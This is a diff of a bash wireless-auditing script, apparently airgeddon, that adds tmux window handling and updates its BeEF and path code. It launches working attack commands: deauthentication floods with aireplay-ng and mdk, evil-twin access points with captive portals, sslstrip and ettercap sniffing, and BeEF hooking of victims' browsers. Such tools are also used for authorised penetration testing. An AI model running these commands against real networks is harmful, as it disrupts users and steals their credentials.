+					iwconfig "${interface}" mode "monitor" > /dev/null 2>&1
+					ifconfig "${interface}" up > /dev/null 2>&1
+				fi
+				ifacemode="Monitor"
+			fi
+		}
+
+		#Save some vars to a file to get read from main script
+		function save_returning_vars_to_file() {
+			{
+			echo -e "interface=${interface}"
+			echo -e "phy_interface=${phy_interface}"
+			echo -e "current_iface_on_messages=${current_iface_on_messages}"
+			echo -e "ifacemode=${ifacemode}"
+			} > "${enterprise_returning_vars_file}"
+		}
+	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&7 <<-EOF
+			function kill_tmux_windows() {
+
+				local TMUX_WINDOWS_LIST=()
+				local current_window_name
+				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
+					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
+					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
+						continue
+					fi
+					if [ -n "\${1}" ]; then
+						if [ "\${current_window_name}" = "\${1}" ]; then
+							continue
+						fi
+					fi
+					tmux kill-window -t "${session_name}:\${current_window_name}"
+				done
+			}
+		EOF
+	fi
 
 	cat >&7 <<-'EOF'
 		#Kill Evil Twin Enterprise processes
@@ -8420,6 +9550,15 @@ function set_enterprise_control_script() {
 
 			if [ ${break_on_next_loop} -eq 1 ]; then
 				kill_enterprise_windows
+	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&7 <<-EOF
+				kill_tmux_windows "Control"
+		EOF
+	fi
+
+	cat >&7 <<-'EOF'
 				break
 			fi
 
@@ -8440,6 +9579,12 @@ function set_enterprise_control_script() {
 			echo -e "\t${log_reminder_msg}"
 			echo
 			echo -e "\t${done_msg}"
+
+			if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
+				restore_interface
+				save_returning_vars_to_file
+			fi
+
 			exit 0
 		fi
 	EOF
@@ -8482,6 +9627,29 @@ function set_et_control_script() {
 				done
 			}
 	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&7 <<-EOF
+			function kill_tmux_windows() {
+
+				local TMUX_WINDOWS_LIST=()
+				local current_window_name
+				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
+					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
+					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
+						continue
+					fi
+					if [ -n "\${1}" ]; then
+						if [ "\${current_window_name}" = "\${1}" ]; then
+							continue
+						fi
+					fi
+					tmux kill-window -t "${session_name}:\${current_window_name}"
+				done
+			}
+		EOF
+	fi
 
 	cat >&7 <<-EOF
 			function finish_evil_twin() {
@@ -8555,11 +9723,20 @@ function set_et_control_script() {
 				} >> "${et_captive_portal_logpath}"
 
 				sleep 2
-				kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
-				kill "$(ps -C dhcpd --no-headers -o pid)" &> /dev/null
-				kill "$(ps -C aireplay-ng --no-headers -o pid)" &> /dev/null
-				kill "$(ps -C lighttpd --no-headers -o pid)" &> /dev/null
+				kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
+				kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
+				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
+				kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 				kill_et_windows
+	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&7 <<-EOF
+				kill_tmux_windows "Control"
+		EOF
+	fi
+
+	cat >&7 <<-EOF
 				exit 0
 			}
 		fi
@@ -8689,8 +9866,14 @@ function launch_dns_blackhole() {
 	debug_print
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg blue -geometry "${g4_middleright_window}" -T "DNS" -e "${optional_tools_names[12]} -i ${interface}" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[12]} -i ${interface}" "DNS"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "${optional_tools_names[12]} -i ${interface}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
 }
 
 #Launch control window for Enterprise attacks
@@ -8699,8 +9882,14 @@ function launch_enterprise_control_window() {
 	debug_print
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg white -geometry "${g1_topright_window}" -T "Control" -e "bash \"${tmpdir}${control_enterprise_file}\"" > /dev/null 2>&1 &
-	enterprise_process_control_window=$!
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Control\"" "bash \"${tmpdir}${control_enterprise_file}\"" "Control" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		enterprise_process_control_window=$!
+	else
+		get_tmux_process_id "bash \"${tmpdir}${control_enterprise_file}\""
+		enterprise_process_control_window="${global_process_pid}"
+		global_process_pid=""
+	fi
 }
 
 #Launch control window for Evil Twin attacks
@@ -8717,11 +9906,7 @@ function launch_et_control_window() {
 			control_scr_window_position=${g3_topright_window}
 		;;
 		"et_captive_portal")
-			if [ ${captive_portal_mode} = "internet" ]; then
-				control_scr_window_position=${g3_topright_window}
-			else
-				control_scr_window_position=${g4_topright_window}
-			fi
+			control_scr_window_position=${g4_topright_window}
 		;;
 		"et_sniffing_sslstrip")
 			control_scr_window_position=${g4_topright_window}
@@ -8730,8 +9915,14 @@ function launch_et_control_window() {
 			control_scr_window_position=${g4_topright_window}
 		;;
 	esac
-	xterm -hold -bg black -fg white -geometry "${control_scr_window_position}" -T "Control" -e "bash \"${tmpdir}${control_et_file}\"" > /dev/null 2>&1 &
-	et_process_control_window=$!
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_process_control_window=$!
+	else
+		get_tmux_process_id "bash \"${tmpdir}${control_et_file}\""
+		et_process_control_window="${global_process_pid}"
+		global_process_pid=""
+	fi
 }
 
 #Create configuration file for lighttpd
@@ -8763,9 +9954,6 @@ function set_webserver_config() {
 function set_captive_portal_page() {
 
 	debug_print
-
-	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
-	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1
 
 	{
 	echo -e "body * {"
@@ -8970,15 +10158,17 @@ function launch_webserver() {
 
 	debug_print
 
-	kill "$(ps -C lighttpd --no-headers -o pid)" &> /dev/null
+	kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 	recalculate_windows_sizes
-	if [ ${captive_portal_mode} = "internet" ]; then
-		lighttpd_window_position=${g3_bottomright_window}
+	lighttpd_window_position=${g4_bottomright_window}
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
 	else
-		lighttpd_window_position=${g4_bottomright_window}
+		get_tmux_process_id "lighttpd -D -f \"${tmpdir}${webserver_file}\""
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
 	fi
-	xterm -hold -bg black -fg yellow -geometry "${lighttpd_window_position}" -T "Webserver" -e "lighttpd -D -f \"${tmpdir}${webserver_file}\"" > /dev/null 2>&1 &
-	et_processes+=($!)
 }
 
 #Launch sslstrip for sslstrip sniffing Evil Twin attack
@@ -8988,8 +10178,14 @@ function launch_sslstrip() {
 
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg blue -geometry "${g4_middleright_window}" -T "Sslstrip" -e "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"Sslstrip\"" "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" "Sslstrip"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
 }
 
 #Launch ettercap sniffer
@@ -9011,8 +10207,14 @@ function launch_ettercap_sniffing() {
 		ettercap_cmd+=" -l \"${tmp_ettercaplog}\""
 	fi
 
-	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer" -e "${ettercap_cmd}" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer\"" "${ettercap_cmd}" "Sniffer"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "${ettercap_cmd}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
 }
 
 #Create configuration file for beef
@@ -9030,10 +10232,24 @@ function set_beef_config() {
 		beef_db_path="${beef_db}"
 	fi
 
+	local permitted_ui_subnet
+	local permitted_ui_ipv6
 	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_fixed_beef_iptables_issue}"; then
-		beef_panel_restriction="        permitted_ui_subnet: \"127.0.0.1/32\""
+		permitted_ui_subnet="${loopback_ip}/${ip_mask_cidr}"
+		permitted_ui_ipv6="${loopback_ipv6}"
 	else
-		beef_panel_restriction="        permitted_ui_subnet: \"0.0.0.0/0\""
+		permitted_ui_subnet="${any_ip}/${any_mask_cidr}"
+		permitted_ui_ipv6="${any_ipv6}"
+	fi
+
+	local permitted_hooking_subnet
+	local beef_panel_restriction
+	if compare_floats_greater_or_equal "${beef_version}" "${beef_needed_brackets_version}"; then
+		permitted_hooking_subnet="        permitted_hooking_subnet: [\"${et_ip_range}/${std_c_mask_cidr}\", \"${any_ipv6}\"]"
+		beef_panel_restriction="        permitted_ui_subnet: [\"${permitted_ui_subnet}\", \"${permitted_ui_ipv6}\"]"
+	else
+		permitted_hooking_subnet="        permitted_hooking_subnet: \"${et_ip_range}/${std_c_mask_cidr}\""
+		beef_panel_restriction="        permitted_ui_subnet: \"${permitted_ui_subnet}\""
 	fi
 
 	{
@@ -9043,11 +10259,11 @@ function set_beef_config() {
 	echo -e "    client_debug: false"
 	echo -e "    crypto_default_value_length: 80"
 	echo -e "    restrictions:"
-	echo -e "        permitted_hooking_subnet: \"${et_ip_range}/24\""
+	echo -e "${permitted_hooking_subnet}"
 	echo -e "${beef_panel_restriction}"
 	echo -e "    http:"
 	echo -e "        debug: false"
-	echo -e "        host: \"0.0.0.0\""
+	echo -e "        host: \"${any_ip}\""
 	echo -e "        port: \"${beef_port}\""
 	echo -e "        dns_host: \"localhost\""
 	echo -e "        dns_port: 53"
@@ -9097,18 +10313,24 @@ function set_beef_config() {
 	echo -e "            enable: false"
 	echo -e "        dns_rebinding:"
 	echo -e "            enable: false"
+	echo -e "        admin_ui:"
+	echo -e "            enable: true"
+	echo -e "            base_path: \"/ui\""
 	} >> "${tmpdir}${beef_file}"
 }
 
 #Kill beef process
+#shellcheck disable=SC2009
 function kill_beef() {
 
 	debug_print
 
 	local beef_pid
-	beef_pid="$(ps -C "${optional_tools_names[19]}" --no-headers -o pid  | tr -d ' ')"
+	beef_pid="$(ps -C "${optional_tools_names[18]}" --no-headers -o pid | tr -d ' ')"
 	if ! kill "${beef_pid}" &> /dev/null; then
-		kill "$(ps -C "beef" --no-headers -o pid  | tr -d ' ')" &> /dev/null
+		if ! kill "$(ps -C "beef" --no-headers -o pid | tr -d ' ')" &> /dev/null; then
+			kill "$(ps -C "ruby" --no-headers -o pid,cmd | grep "beef" | awk '{print $1}')" &> /dev/null
+		fi
 	fi
 }
 
@@ -9149,7 +10371,7 @@ function prepare_beef_start() {
 	debug_print
 
 	valid_possible_beef_path=0
-	if [[ ${beef_found} -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 0 ]]; then
+	if [[ ${beef_found} -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 0 ]]; then
 		language_strings "${language}" 405 "blue"
 		ask_yesno 191 "yes"
 		if [ "${yesno}" = "y" ]; then
@@ -9166,12 +10388,12 @@ function prepare_beef_start() {
 			language_strings "${language}" 413 "yellow"
 			language_strings "${language}" 115 "read"
 		fi
-	elif [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 0 ]]; then
+	elif [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 0 ]]; then
 		fix_beef_executable "${beef_path}"
 		echo
 		language_strings "${language}" 413 "yellow"
 		language_strings "${language}" 115 "read"
-	elif [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
+	elif [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
 		language_strings "${language}" 405 "blue"
 		ask_yesno 415 "yes"
 		if [ "${yesno}" = "y" ]; then
@@ -9195,7 +10417,9 @@ function manual_beef_set() {
 	while [[ "${valid_possible_beef_path}" != "1" ]]; do
 		echo
 		language_strings "${language}" 402 "green"
-		read -rp "> " manually_entered_beef_path
+		echo -en '> '
+		read -re manually_entered_beef_path
+		manually_entered_beef_path=$(fix_autocomplete_chars "${manually_entered_beef_path}")
 		if [ -n "${manually_entered_beef_path}" ]; then
 			lastcharmanually_entered_beef_path=${manually_entered_beef_path: -1}
 			if [ "${lastcharmanually_entered_beef_path}" != "/" ]; then
@@ -9209,7 +10433,7 @@ function manual_beef_set() {
 				if [ -d "${manually_entered_beef_path}" ]; then
 					if [ -f "${manually_entered_beef_path}beef" ]; then
 						if head "${manually_entered_beef_path}beef" -n 1 2> /dev/null | grep ruby > /dev/null; then
-							possible_beef_known_locations+=(${manually_entered_beef_path})
+							possible_beef_known_locations+=("${manually_entered_beef_path}")
 							valid_possible_beef_path=1
 						else
 							language_strings "${language}" 406 "red"
@@ -9237,7 +10461,7 @@ function fix_beef_executable() {
 	echo -e "./beef"
 	} >> "/usr/bin/beef"
 	chmod +x "/usr/bin/beef" > /dev/null 2>&1
-	optional_tools[${optional_tools_names[19]}]=1
+	optional_tools[${optional_tools_names[18]}]=1
 
 	rewrite_script_with_custom_beef "set" "${1}"
 }
@@ -9265,12 +10489,13 @@ function start_beef_service() {
 
 	debug_print
 
-	if ! service "${optional_tools_names[19]}" restart > /dev/null 2>&1; then
-		systemctl restart "${optional_tools_names[19]}.service" > /dev/null 2>&1
+	if ! service "${optional_tools_names[18]}" restart > /dev/null 2>&1; then
+		systemctl restart "${optional_tools_names[18]}.service" > /dev/null 2>&1
 	fi
 }
 
 #Launch beef browser exploitation framework
+#shellcheck disable=SC2164
 function launch_beef() {
 
 	debug_print
@@ -9285,11 +10510,26 @@ function launch_beef() {
 	if [ "${beef_found}" -eq 1 ]; then
 		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
 		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
-		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "cd ${beef_path} && ./beef -c \"${beef_file}\"" > /dev/null 2>&1 &
+		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "cd ${beef_path} && ./beef -c \"${beef_file}\"" "BeEF"
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+			cd "${beef_path}"
+			get_tmux_process_id "./beef -c \"${beef_file}\""
+			et_processes+=("${global_process_pid}")
+			global_process_pid=""
+		fi
 	else
-		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "${optional_tools_names[19]}" > /dev/null 2>&1 &
+		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "${optional_tools_names[18]}" "BeEF"
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+			get_tmux_process_id "{optional_tools_names[18]}"
+			et_processes+=("${global_process_pid}")
+			global_process_pid=""
+		fi
 	fi
-	et_processes+=($!)
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	fi
+
 	sleep 2
 }
 
@@ -9311,8 +10551,14 @@ function launch_bettercap_sniffing() {
 		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
 	fi
 
-	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer+Bettercap-Sslstrip2/BeEF" -e "${bettercap_cmd}" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer+Bettercap-Sslstrip2/BeEF\"" "${bettercap_cmd}" "Sniffer+Bettercap-Sslstrip2/BeEF"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		get_tmux_process_id "${bettercap_cmd}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	else
+		et_processes+=($!)
+	fi
 }
 
 #Parse ettercap log searching for captured passwords
@@ -9445,11 +10691,11 @@ function kill_et_windows() {
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		kill_dos_pursuit_mode_processes
 		case ${et_dos_attack} in
-			"Mdk3"|"Wds Confusion")
-				kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
+			"${mdk_command}"|"Wds Confusion")
+				kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
 			;;
 			"Aireplay")
-				kill "$(ps -C aireplay-ng --no-headers -o pid)" &> /dev/null
+				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
 			;;
 		esac
 	fi
@@ -9459,11 +10705,15 @@ function kill_et_windows() {
 	done
 
 	if [ -n "${enterprise_mode}" ]; then
-		kill ${enterprise_process_control_window} &> /dev/null
-		kill "$(ps -C hostapd-wpe --no-headers -o pid)" &> /dev/null
+		kill "${enterprise_process_control_window}" &> /dev/null
+		kill "$(ps -C hostapd-wpe --no-headers -o pid | tr -d ' ')" &> /dev/null
 	else
-		kill ${et_process_control_window} &> /dev/null
-		kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
+		kill "${et_process_control_window}" &> /dev/null
+		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
+	fi
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		kill_tmux_windows
 	fi
 }
 
@@ -9655,13 +10905,13 @@ function dos_attacks_menu() {
 	language_strings "${language}" 56
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
-	language_strings "${language}" 51 mdk3_attack_dependencies[@]
+	language_strings "${language}" 51 mdk_attack_dependencies[@]
 	language_strings "${language}" 52 aireplay_attack_dependencies[@]
-	language_strings "${language}" 53 mdk3_attack_dependencies[@]
+	language_strings "${language}" 53 mdk_attack_dependencies[@]
 	language_strings "${language}" 54 "separator"
-	language_strings "${language}" 62 mdk3_attack_dependencies[@]
-	language_strings "${language}" 63 mdk3_attack_dependencies[@]
-	language_strings "${language}" 64 mdk3_attack_dependencies[@]
+	language_strings "${language}" 62 mdk_attack_dependencies[@]
+	language_strings "${language}" 63 mdk_attack_dependencies[@]
+	language_strings "${language}" 64 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " dos_option
@@ -9685,7 +10935,7 @@ function dos_attacks_menu() {
 			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				mdk3_deauth_option
+				mdk_deauth_option
 			fi
 		;;
 		6)
@@ -9744,29 +10994,50 @@ function capture_handshake_evil_twin() {
 	capture_handshake_window
 
 	case ${et_dos_attack} in
-		"Mdk3")
+		"${mdk_command}")
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
+				processidattack="${global_process_pid}"
+				global_process_pid=""
+			fi
 			sleeptimeattack=12
 		;;
 		"Aireplay")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
+				processidattack="${global_process_pid}"
+				global_process_pid=""
+			fi
 			sleeptimeattack=12
 		;;
 		"Wds Confusion")
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
+				processidattack="${global_process_pid}"
+				global_process_pid=""
+			fi
 			sleeptimeattack=16
 		;;
 	esac
 
-	processidattack=$!
-	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		processidattack=$!
+		sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+	else
+		sleep ${sleeptimeattack} && kill ${processidattack} && kill_tmux_windows "Capturing Handshake" &> /dev/null
+	fi
+
 	handshake_capture_check
+
 	if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent"; then
 
 		handshakepath="${default_save_path}"
@@ -9824,7 +11095,7 @@ function capture_handshake() {
 	language_strings "${language}" 126 "yellow"
 	language_strings "${language}" 115 "read"
 
-	attack_handshake_menu "new"
+	dos_handshake_menu
 }
 
 #Check if file exists
@@ -9832,7 +11103,7 @@ function check_file_exists() {
 
 	debug_print
 
-	if [[ ! -f "${1}" || -z "${1}" ]]; then
+	if [[ ! -f "${1}" ]] || [[ -z "${1}" ]]; then
 		language_strings "${language}" 161 "red"
 		return 1
 	fi
@@ -9846,7 +11117,7 @@ function validate_path() {
 
 	lastcharmanualpath=${1: -1}
 
-	if [ "${2}" = "enterprisepot" ]; then
+	if [[ "${2}" = "enterprisepot" ]] || [[ "${2}" = "certificates" ]]; then
 		dirname=$(dirname "${1}")
 
 		if [ -d "${dirname}" ]; then
@@ -9878,7 +11149,7 @@ function validate_path() {
 		fi
 	fi
 
-	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]] || [[ "${2}" = "enterprisepot" ]]; then
+	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]] || [[ "${2}" = "enterprisepot" ]] || [[ "${2}" = "certificates" ]]; then
 		if [ "${lastcharmanualpath}" != "/" ]; then
 			pathname="${1}/"
 		else
@@ -9951,6 +11222,23 @@ function validate_path() {
 				language_strings "${language}" 158 "yellow"
 				return 0
 			;;
+			"certificates")
+				enterprisecertspath="${pathname}"
+				enterprisecerts_basepath=$(dirname "${enterprisecertspath}")
+
+				if [ "${enterprisecerts_basepath}" != "/" ]; then
+					enterprisecerts_basepath+="/"
+				fi
+
+				enterprisecerts_completepath="${enterprisecertspath}"
+				if [ "${enterprisecertspath: -1}" != "/" ]; then
+					enterprisecerts_completepath+="/"
+				fi
+
+				echo
+				language_strings "${language}" 158 "yellow"
+				return 0
+			;;
 		esac
 
 		echo
@@ -9991,15 +11279,29 @@ function check_write_permissions() {
 	return 1
 }
 
+#Clean some special chars from strings usually messing with autocompleted paths
+function fix_autocomplete_chars() {
+
+	debug_print
+
+	local var
+	var=${1//\\/$''}
+
+	echo "${var}"
+}
+
 #Create a var with the name passed to the function and reading the value from the user input
 function read_and_clean_path() {
 
 	debug_print
 
+	local var
 	settings="$(shopt -p extglob)"
 	shopt -s extglob
 
-	read -rp "> " var
+	echo -en '> '
+	read -re var
+	var=$(fix_autocomplete_chars "${var}")
 	local regexp='^[ '"'"']*(.*[^ '"'"'])[ '"'"']*$'
 	[[ ${var} =~ ${regexp} ]] && var="${BASH_REMATCH[1]}"
 	eval "${1}=\$var"
@@ -10145,6 +11447,14 @@ function read_path() {
 			fi
 			validate_path "${enterprisepotenteredpath}" "${1}"
 		;;
+		"certificates")
+			language_strings "${language}" 643 "blue"
+			read_and_clean_path "certificatesenteredpath"
+			if [ -z "${certificatesenteredpath}" ]; then
+				certificatesenteredpath="${enterprisecertspath}"
+			fi
+			validate_path "${certificatesenteredpath}" "${1}"
+		;;
 	esac
 
 	validpath="$?"
@@ -10152,52 +11462,26 @@ function read_path() {
 }
 
 #Launch the DoS selection menu before capture a Handshake and process the captured file
-function attack_handshake_menu() {
+function dos_handshake_menu() {
 
 	debug_print
 
-	if [ "${1}" = "handshake" ]; then
-		handshake_capture_check
-		if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent"; then
-
-			handshakepath="${default_save_path}"
-			lastcharhandshakepath=${handshakepath: -1}
-			if [ "${lastcharhandshakepath}" != "/" ]; then
-				handshakepath="${handshakepath}/"
-			fi
-			handshakefilename="handshake-${bssid}.cap"
-			handshakepath="${handshakepath}${handshakefilename}"
-
-			language_strings "${language}" 162 "yellow"
-			validpath=1
-			while [[ "${validpath}" != "0" ]]; do
-				read_path "handshake"
-			done
-
-			cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
-			echo
-			language_strings "${language}" 149 "blue"
-			language_strings "${language}" 115 "read"
-			return
-		else
-			echo
-			language_strings "${language}" 146 "red"
-			language_strings "${language}" 115 "read"
-		fi
+	if [ "${return_to_handshake_tools_menu}" -eq 1 ]; then
+		return
 	fi
 
 	clear
 	language_strings "${language}" 138 "title"
-	current_menu="attack_handshake_menu"
+	current_menu="dos_handshake_menu"
 	initialize_menu_and_print_selections
 	echo
 	language_strings "${language}" 47 "green"
 	print_simple_separator
 	language_strings "${language}" 147
 	print_simple_separator
-	language_strings "${language}" 139 mdk3_attack_dependencies[@]
+	language_strings "${language}" 139 mdk_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
-	language_strings "${language}" 141 mdk3_attack_dependencies[@]
+	language_strings "${language}" 141 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " attack_handshake_option
@@ -10208,52 +11492,104 @@ function attack_handshake_menu() {
 		1)
 			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
-				attack_handshake_menu "new"
 			else
 				ask_timeout "capture_handshake"
 				capture_handshake_window
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
+					processidattack="${global_process_pid}"
+					global_process_pid=""
+				fi
 				sleeptimeattack=12
+				launch_handshake_capture
